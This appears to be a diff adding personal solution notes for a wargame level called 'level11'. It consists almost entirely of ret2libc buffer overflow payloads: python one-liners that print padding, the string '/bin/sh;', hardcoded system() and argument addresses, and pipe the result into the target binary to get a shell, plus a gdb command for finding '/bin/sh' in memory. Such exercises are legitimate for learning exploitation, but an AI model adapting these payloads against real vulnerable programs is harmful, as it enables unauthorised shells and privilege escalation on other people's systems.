@@ -1,0 +1,13 @@
+
+in gdb:
+                  padding               system address     return after system        string address
+(python -c 'print "A"*20+"/bin/sh;" + "\x60\x63\xe6\xf7" +      "BBBB" +        "\xf0\xdb\xff\xff"'; cat)
+
+
+outside:
+(python -c 'print "AAAAAAAA"+"/bin/sh;   "+"BBBBBBBBC" + "\x60\x63\xe6\xf7" + "BBBB" + "\x28\xdc\xff\xff"'; cat) | ./level11
+
+
+
+# could have done:
+find &system,+9999999,"/bin/sh"
